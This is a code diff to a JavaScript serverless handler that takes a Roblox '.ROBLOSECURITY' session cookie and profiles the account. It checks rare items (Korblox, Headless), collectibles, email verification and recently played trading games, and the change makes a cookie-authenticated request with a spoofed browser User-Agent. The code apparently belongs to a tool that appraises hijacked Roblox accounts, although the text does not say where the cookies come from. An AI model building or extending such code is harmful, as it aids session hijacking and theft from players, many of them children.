@@ -178,25 +178,34 @@ async function checkItemOwnership(userId, cookie, assetId) {
   }
 }
 
-// ---------- FIXED: Recently Played Games (using official API) ----------
-async function getRecentlyPlayedGames(userId) {
+// ---------- FIXED: Recently Played Games (using Continue endpoint with cookie) ----------
+async function getRecentlyPlayedGames(cookie) {
   try {
-    const res = await fetch(`https://games.roblox.com/v1/users/${userId}/recent-games`);
-    if (!res.ok) return [];
+    const res = await fetch("https://www.roblox.com/charts/v2/Continue", {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cookie}`,
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      }
+    });
+    if (!res.ok) {
+      console.error(`Continue API failed with status ${res.status}`);
+      return [];
+    }
     const data = await res.json();
-    // The response is an object with a 'data' array containing games
-    const games = data.data || [];
-    return games.map(game => game.name || "");
+    // The response can be an object with a 'data' array or directly an array
+    const games = Array.isArray(data) ? data : (data.data || []);
+    console.log(`Found ${games.length} games in Continue list`);
+    return games.map(game => game.name || game.displayName || "");
   } catch (e) {
-    console.warn("Failed to fetch recent games:", e.message);
+    console.error("Failed to fetch Continue list:", e.message);
     return [];
   }
 }
 
-async function getPlayedPasses(userId) {
+async function getPlayedPasses(cookie) {
   const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
-  const recentGames = await getRecentlyPlayedGames(userId);
-  console.log("Recent games found:", recentGames); // Logs to Vercel console
+  const recentGames = await getRecentlyPlayedGames(cookie);
+  console.log("Recent game names:", recentGames);
   return targetGames.map(name => {
     const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
     return { name, played: played ? "True" : "False" };
@@ -262,12 +271,12 @@ export default async function handler(req, res) {
       getGroupsCount(rbxuid),
       getTotalPlaceVisits(rbxuid),
       getAllCollectibles(rbxuid, cookie),
-      getPlayedPasses(rbxuid),
+      getPlayedPasses(cookie),
       getCountryFlag(req),
       getUserAvatarUrl(rbxuid),
       isEmailVerified(rbxuid, cookie),
-      checkItemOwnership(rbxuid, cookie, 1373933),      // Korblox Deathspeaker
-      checkItemOwnership(rbxuid, cookie, 134082613)     // Headless Horseman
+      checkItemOwnership(rbxuid, cookie, 1373933),      // Korblox
+      checkItemOwnership(rbxuid, cookie, 134082613)     // Headless
     ]);
 
     let settings = { verified: "False", banned: "False" };
